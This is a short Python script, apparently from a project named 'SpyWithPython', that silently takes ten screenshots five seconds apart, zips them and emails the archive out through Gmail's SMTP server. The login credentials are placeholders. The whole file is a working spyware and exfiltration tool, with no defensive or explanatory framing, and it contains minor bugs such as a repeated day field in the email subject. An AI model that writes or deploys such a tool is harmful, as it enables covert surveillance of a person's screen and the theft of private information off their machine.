import shutil
import pyscreenshot as imagegraber
import os
import shutil
import smtplib
import time
from datetime import datetime
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart 


os.mkdir("D:\Python\Python Projects\SpyWithPython\Images")
path = "D:/Python/Python Projects/SpyWithPython/Images"
for i in range(10):
    image = imagegraber.grab()
    image.save(f"D:/Python/Python Projects/SpyWithPython/Images/image{i}.jpg")
    time.sleep(5)


def archiver(path):
    shutil.make_archive("Iarchive", "zip", path)
archiver(path)
os.chmod("D:/Python/Python Projects/SpyWithPython/", 0o444)
os.chdir("D:/Python/Python Projects/SpyWithPython/")

SERVER = 'smtp.gmail.com'
PORT = 587
FROM = 'Enter your gmail here'
TO = 'Enter your gmail here'
PASS = '***********'

now = datetime.now()
msg = MIMEMultipart()

msg['Subject'] = 'Generated Screenshots [Automated Email]' + ' ' + \
    str(now.day) + '-' + str(now.day) + '-' + \
    str(now.month) + '-' + str(now.year)
msg['From'] = FROM
msg['To'] = TO

with open("D:/Python/Python Projects/SpyWithPython/Iarchive.zip", 'rb') as p:
    msg.attach(MIMEApplication(p.read(), Name='Iarchive.zip'))


server = smtplib.SMTP(SERVER, PORT)
server.set_debuglevel(1)
server.ehlo()
server.starttls()
server.login(FROM, PASS)
server.sendmail(FROM, TO, msg.as_string())
server.quit()
